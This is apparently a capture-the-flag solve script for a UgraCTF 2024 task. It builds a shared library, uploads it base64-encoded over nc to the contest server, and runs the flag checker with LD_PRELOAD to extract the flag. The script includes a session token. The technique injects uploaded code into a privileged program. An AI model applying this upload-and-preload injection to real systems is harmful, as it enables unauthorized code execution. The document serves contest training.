#!/usr/bin/env bash
set -e
TOKEN="bg00rw2yzql21nvp"
musl-gcc solution.c -o solution.so -shared
{ printf "$TOKEN\nbase64 -d >/tmp/solution.so <<EOF\n"; base64 solution.so; printf "EOF\nLD_PRELOAD=/tmp/solution.so /check_flag\nexit\n"; } | nc inthedark.q.2024.ugractf.ru 9275 | strings | grep ugra_
